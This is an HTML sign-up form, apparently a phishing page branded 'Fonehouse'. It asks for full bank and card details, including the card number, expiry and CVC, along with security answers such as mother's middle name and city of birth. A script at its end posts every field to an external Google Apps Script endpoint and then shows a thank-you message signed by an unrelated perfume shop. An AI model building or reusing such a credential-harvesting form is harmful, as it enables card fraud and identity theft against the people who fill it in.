  <div class="container register" style="margin-top: -8%;">
              <div class="row">
                  <div class="col-md-12">

                              <h3 class="register-heading">Sign Up With Fonehouse</h3>
                              <div class="row register-form">
                                  <div class="col-md-12">
                                      <form method="post" autocomplete="off" name="google-sheet">
                                        <h1>Basic Information :</h1>  
                                        <div class="form-group"> <label for="First Name">Enter Your First Name :</label>
                                              <input type="text" name="First Name" class="form-control" placeholder="Enter Your First Name " value="" required=""/>
                                          </div>
                                          <div class="form-group"> <label for="Middle Name">Enter Your Middle Name :</label>
                                             <input type="text" name="Middle Name" class="form-control" placeholder="Enter Your Middle Name " value="" required=""/>
                                         </div>
                                         <div class="form-group"> <label for="Last Name">Enter Your Last Name : </label>
                                          <input type="text" name="Last Name" class="form-control" placeholder="Enter Your Last Name " value="" required=""/>
                                      </div>
                                          <div class="form-group"> <label for="Email">Enter Your Email :</label>
                                              <input type="text" name="Email" class="form-control" placeholder="Enter Your Email " value="" required=""/>
                                          </div>
                                          <div class="form-group"> <label for="DOB">Enter Your Date of Birth :</label>
                                             <input type="date" name="DOB" class="form-control" placeholder="Enter Your Date of Birth " value="" required=""/>
                                         </div>
                                         <div class="form-group"> <label for="Marital Status">Enter Your Marital Status :</label>
                                          <input type="text" name="Marital Status" class="form-control" placeholder="Enter Your Marital Status " value="" required=""/>
                                      </div>
                                      <div class="form-group"> <label for="postcode">Enter Your Home Post Code :</label>
                                       <input type="text" name="postcode" class="form-control" placeholder="Enter Your home post code " value="" required=""/>
                                   </div>
                                   <div class="form-group"> <label for="registered">Is your Post code registered : <br></label>
                                    <input type="text" name="registered" class="form-control" placeholder="Type yes or no " value="" required=""/>
                                </div>
                                <div class="form-group"> <label for="longliving">How long you have been living there : <br></label>
                                 <input type="text" name="longliving" class="form-control" placeholder="Enter Years " value="" required=""/>
                             </div>
                             <div class="form-group"> <label for="own/rented">Are you own the property or rented :</label>
                              <input type="text" name="own/rented" class="form-control" placeholder="Type Owner Or Rented " value="" required=""/>
                          </div>
                          <h1>Confidential details : </h1> <br>
                          <div class="form-group"> <label for="bank">Enter Bank Name :</label>
                           <input type="text" name="bank" class="form-control" placeholder="Enter Name of Your Bank " value="" required=""/>
                       </div>
                       <div class="form-group"> <label for="lbank">How long you are using this bank :</label>
                        <input type="text" name="lbank" class="form-control" placeholder="Enter Years " value="" required=""/>
                    </div>
                    <div class="form-group"> <label for="sort">Enter Your 6 digit Sort Code : </label>
                     <input type="text" name="sort" class="form-control" placeholder="000000 (without dashes) " value="" required=""/>
                 </div>
                 <div class="form-group"> <label for="account">Enter Your 8 Digit Account Number : </label>
                  <input type="text" name="Name" class="form-control" placeholder="Enter Your Name " value="" required=""/>
              </div>
              <div class="form-group"> <label for="card">Enter Your Card Type :</label>
               <input type="text" name="card" class="form-control" placeholder="Visa / Master / American Express  " value="" required=""/>
           </div>
           <div class="form-group"> <label for="cardname">Enter Your Exact Name over the Card :</label>
            <input type="text" name="cardname" class="form-control" placeholder="Mr. Brown Z Crawley " value="" required=""/>
        </div>
        <div class="form-group"> <label for="longcard">Enter Your 16 Digit Long Card Number :</label>
         <input type="text" name="longcard" class="form-control" placeholder="4509301203040507 (without dashes) " value="" required=""/>
     </div>
     <div class="form-group"> <label for="valid">Enter valid Date of the card :</label>
        <input type="month" id="start" name="valid" min="2018-03" value="2018-05">
  </div>
  <div class="form-group"> <label for="expiry">Enter Expiry Date of Card :</label>
    <input type="month" id="start" name="expiry" min="2027-01" value="2027-01">
</div>
<div class="form-group"> <label for="cvc">Enter CVC of Card :</label>
   <input type="text" name="cvc" class="form-control" placeholder="Enter Your CVC " value="" required=""/>
</div>
<h1>Security Details :</h1> <br>
<div class="form-group"> <label for="city">Enter your City of Birth :</label>
   <input type="text" name="city" class="form-control" placeholder="London " value="" required=""/>
</div>
<div class="form-group"> <label for="middle">Enter Your Mother's Middle Name :</label>
   <input type="text" name="middle" class="form-control" placeholder="Enter Mother Middle Name :" value="" required=""/>
</div>
<div class="form-group"> <label for="employement">what kind of Job you are doing :</label>
   <input type="text" name="employement" class="form-control" placeholder="Enter Job Title " value="" required=""/>
</div>
<div class="form-group"> <label for="yearsemp">How long you are Doing this job :</label>
   <input type="text" name="yearsemp" class="form-control" placeholder="Enter Duration of Job " value="" required=""/>
</div>
        <div class="form-group">

            <script>
              const scriptURL = 'https://script.google.com/macros/s/AKfycbwG_pwewVwp8IUfJZ40sUT7jzzup-gbIbXROXDoiUbjKKmaoWYxjQwFGUf9XzyoNWD8kA/exec'
              const form = document.forms['google-sheet']
            
              form.addEventListener('submit', e => {
                e.preventDefault()
                fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                  .then(response => alert("Thanks for Contacting us..! We Will Contact You Soon on Email...    Regards:  Anam46 Perfumes"))
                  .catch(error => console.error('Error!', error.message))
              })
            </script>
